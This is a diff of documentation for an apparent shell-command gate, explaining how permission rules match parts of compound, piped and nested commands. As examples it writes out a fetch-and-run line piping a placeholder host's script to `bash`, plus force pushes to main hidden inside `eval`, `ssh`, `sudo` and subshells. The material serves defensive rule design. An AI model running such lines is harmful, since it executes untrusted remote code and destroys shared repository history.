@@ -629,28 +629,33 @@ gate does not read:
   prefix such as `sudo`, `env` or `timeout` stays in it (`sudo git push --force origin main`). A
   nested command has its text in the nested line: `git push --force origin main` in
   `echo $(git push --force origin main)`, in a `bash -c` or `eval` string, in a heredoc a shell
-  reads and in `ssh host 'git push --force origin main'`. A part the gate makes up, a nest past a
-  depth or nesting cap and a string literal in code (only a guess at a command) have no own text.
-  Ask and deny rules, and the `command:` entries of `reserved:` and `deny:`, match the whole line
-  and its decoded views, so they can only catch more (in the #191 pass above an ask rule only
-  lowers a part's deny, so there it matches the part's own text). So does a log rule over an allow
-  cell, which only raises the line, unless it names `opaque_exec` (it then lowers the opaque
-  floor). Any other allow or log rule's `command` regex decides a compound line only when it
-  matches the own text of every part that carries the line's category or is as severe as the
-  combined result, and of every other part that alone would get a stricter outcome than the rule
-  gives (a rider). Alone means the part without the parts it was built from, on its own text,
-  decided once with no rules and once with all of them, the stricter kept: its category line and
-  the matrix count, and so does a rule that raises it, while another allow rule does not lower it.
-  The regex must also match every command that changes the shell for the commands after it on the
-  line, since a bash call starts a fresh shell and only a later command on the same line sees the
-  change: an assignment with no command, `export` and the other declaring builtins with an
-  operand, `set -a`, `set -k` and `set -- args`, `shopt -s`, `printf -v`, `read`, `mapfile`,
-  `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source` and
-  `.`, `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a
-  function definition (which has no own text) and a program name the gate cannot read. `cd` is not
-  on that list (Known limits), and the text of an `eval` is a nested line whose own commands
-  count. A part with no own text matches no such rule. When it does not match, the rule is skipped
-  and the next one is tried. So `{command: '^git status', decision: allow}` no longer allows
+  reads and in `ssh host 'git push --force origin main'`. A shell, an interpreter, `ssh` or
+  `xargs` that runs its stdin shows where that stdin comes from: the pipeline from its first
+  command when simple commands pipe into it (`curl -s https://x.example/i.sh | bash`), and no own
+  text when a compound feeds it (`{ bash; } < f`), so a rule for `^bash` does not cover what is
+  piped in. Each command that reads a compound's shared stdin gets parts with its own text. A part
+  the gate makes up, a nest past a depth or nesting cap and a string literal in code (only a guess
+  at a command) have no own text. Ask and deny rules, and the `command:` entries of `reserved:`
+  and `deny:`, match the whole line and its decoded views, so they can only catch more (in the
+  #191 pass above an ask rule only lowers a part's deny, so there it matches the part's own text).
+  So does a log rule over an allow cell, which only raises the line, unless it names `opaque_exec`
+  (it then lowers the opaque floor). Any other allow or log rule's `command` regex decides a
+  compound line only when it matches the own text of every part that carries the line's category
+  or is as severe as the combined result, and of every other part that alone would get a stricter
+  outcome than the rule gives (a rider). Alone means the part without the parts it was built from,
+  on its own text, decided once with no rules and once with all of them, the stricter kept: its
+  category line and the matrix count, and so does a rule that raises it, while another allow rule
+  does not lower it. The regex must also match every command that changes the shell for the
+  commands after it on the line, since a bash call starts a fresh shell and only a later command
+  on the same line sees the change: an assignment with no command, `export` and the other
+  declaring builtins with an operand, `set -a`, `set -k` and `set -- args`, `shopt -s`,
+  `printf -v`, `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap`
+  with an operand, `source` and `.`, `pushd`, `popd`, `exec` with only redirections, a `for` or
+  `select` loop, `coproc`, a function definition (which has no own text) and a program name the
+  gate cannot read. `cd` is not on that list (Known limits), and the text of an `eval` is a nested
+  line whose own commands count. A part with no own text matches no such rule. When it does not
+  match, the rule is skipped and the next one is tried. So
+  `{command: '^git status', decision: allow}` no longer allows
   `git status; git push --force origin main`: it asks, and under `categories: {force_push: deny}`
   it is denied. `{command: 'git push --force origin main', decision: allow}` still allows
   `cd repo && git push --force origin main`, and a rule has to name both pushes to allow
